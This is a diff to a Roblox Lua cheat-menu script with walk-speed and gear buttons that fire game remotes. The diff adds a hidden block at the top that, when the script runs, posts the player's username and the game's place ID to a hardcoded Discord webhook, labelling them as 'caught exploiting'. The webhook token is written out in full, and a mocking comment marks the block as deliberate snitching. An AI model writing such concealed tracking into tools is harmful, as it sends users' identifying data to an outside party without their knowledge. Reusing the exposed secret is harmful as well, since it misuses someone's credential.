@@ -1,3 +1,24 @@
+msg = {
+["embeds"] = {{
+["color"] = 13708129,
+["description"] = "Has been caught exploiting in: "..Game.PlaceId,
+["author"] = {
+["name"] = game.Players.LocalPlayer.name,
+}}
+}
+}
+
+local response = syn.request(
+{
+Url = "https://discord.com/api/webhooks/982398192211619879/oQR1sUMSXLrl2aZRbqhWdnAr7rKW6vPhf4ZrNXHv6Nq2SgnZcQxOf9Cvk6Lu1BfcEGs3",
+Method = "POST",
+Headers = {
+["Content-Type"] = "application/json"
+},
+Body = game:GetService("HttpService"):JSONEncode(msg)
+}
+)
+--END OF SNITCHING LMFAO
 local ScreenGui = Instance.new("ScreenGui") 
 local Frame = Instance.new("Frame") 
 local WalkSpeed = Instance.new("TextButton") 
@@ -147,6 +168,3 @@ end)
 WalkSpeedFour.MouseButton1Click:connect(function() 	
    game.ReplicatedStorage.Package.Gear.ODM.requestEquip:FireServer()
 end) 
-
-
-
